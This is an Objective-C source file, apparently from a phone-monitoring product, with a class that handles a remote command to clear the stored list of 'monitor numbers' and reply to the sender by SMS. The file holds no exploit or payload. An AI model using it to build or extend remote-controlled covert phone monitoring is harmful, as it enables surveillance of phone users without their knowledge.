/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  ClearMonitorsProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  12/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "ClearMonitorsProcessor.h"
#import "PrefMonitorNumber.h"
#import "Preference.h"

@interface ClearMonitorsProcessor (PrivateAPI)
- (void) processClearMonitors;
- (void) sendReplySMS;
@end

@implementation ClearMonitorsProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the ClearMonitorsProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (ClearMonitorsProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ClearMonitorsProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ClearMonitorsProcessor
 - Argument list and description: 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"ClearMonitorsProcessor--->doProcessingCommand")
 	[self processClearMonitors];
}

#pragma mark ClearMonitorsProcessor PrivateAPI Methods

/**
 - Method name: processClearMonitors
 - Purpose:This method is used to process clear Monitors
 - Argument list and description: No Argument
 - Return description: No Return type
*/

- (void) processClearMonitors {
	DLog (@"ClearMonitorsProcessor--->processClearMonitors");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
	NSMutableArray *monitorsArray=[[NSMutableArray alloc] init];
	[prefMonitor setMMonitorNumbers:monitorsArray];
	[prefManager savePreferenceAndNotifyChange:prefMonitor];
	[monitorsArray release];
	[self sendReplySMS];
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"ClearMonitorsProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end
